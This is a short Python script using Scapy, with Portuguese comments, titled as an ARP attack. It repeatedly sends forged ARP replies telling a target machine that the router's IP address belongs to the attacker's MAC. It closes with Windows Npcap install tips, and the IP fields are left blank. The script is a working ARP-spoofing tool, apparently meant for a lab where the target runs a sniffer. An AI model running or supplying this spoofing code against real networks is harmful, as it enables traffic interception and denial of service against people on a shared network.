# ataque_arp.py
from scapy.all import *
import time

# --- CONFIGURE AQUI ---
IP_DO_ROTEADOR = ""      # O IP do gateway que você quer falsificar.
IP_DO_ALVO = ""      # O IP da Máquina A, que está rodando o sniffer.
# --------------------

print(f"Enviando pacotes ARP falsos para {IP_DO_ALVO}...")
print(f"Afirmando que o roteador ({IP_DO_ROTEADOR}) está no meu endereço MAC.")
print("Pressione Ctrl+C para parar.")

try:
    while True:
        # op=2 significa "is-at" (resposta ARP).
        # psrc é o IP que estamos fingindo ser.
        # pdst é para quem estamos enviando a resposta.
        # hwdst não é necessário, o Scapy preenche com o broadcast.
        pacote_falso = ARP(op=2, psrc=IP_DO_ROTEADOR, pdst=IP_DO_ALVO)
        send(pacote_falso, verbose=False)
        time.sleep(2) # Envia um pacote a cada 2 segundos.
except KeyboardInterrupt:
    print("\nAtaque ARP interrompido.")

# O código acima envia pacotes ARP falsos para a Máquina A, afirmando que o roteador está no endereço MAC do atacante.
# Em caso de "scapy.error.Scapy_Exception: L3WinSocket can only send IP/IPv6 packets ! Install Npcap/Winpcap to send more" instale o Npcap:
# https://nmap.org/npcap/#download
# Durante a instalação, você verá algumas caixas de seleção. É muito importante que você marque a opção: "Install Npcap in WinPcap API-compatible Mode"